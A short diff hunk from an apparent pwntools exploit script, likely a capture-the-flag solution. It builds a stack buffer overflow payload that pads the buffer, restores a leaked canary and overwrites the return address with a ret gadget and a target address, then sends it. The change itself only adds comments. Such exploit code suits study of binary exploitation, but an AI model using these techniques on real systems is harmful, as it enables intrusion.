@@ -72,9 +72,9 @@ payload = flat([
     b'A' * buffer,
     p64(canary),
     b'B' * 8,
-    p64(0x00000000004012f6),
-    p64(0x000000000040121d)
-    ])
+    p64(0x00000000004012f6), # ret gadget
+    p64(0x000000000040121d)  # 
+    ])                  
 io.clean()
 io.sendline(payload)
 
